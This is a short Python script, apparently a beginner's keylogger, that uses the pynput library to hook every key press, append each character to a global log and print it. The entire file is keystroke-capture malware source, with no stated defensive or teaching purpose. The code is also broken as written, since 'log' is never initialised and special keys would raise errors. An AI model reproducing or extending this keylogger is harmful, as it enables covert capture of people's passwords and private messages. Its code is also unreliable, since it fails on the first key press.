import pynput.keyboard

def callback_function(key):
    global log
    log = log + key.char.encode("utf-8")
    #log = log + str(key.char)
    print(log)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()

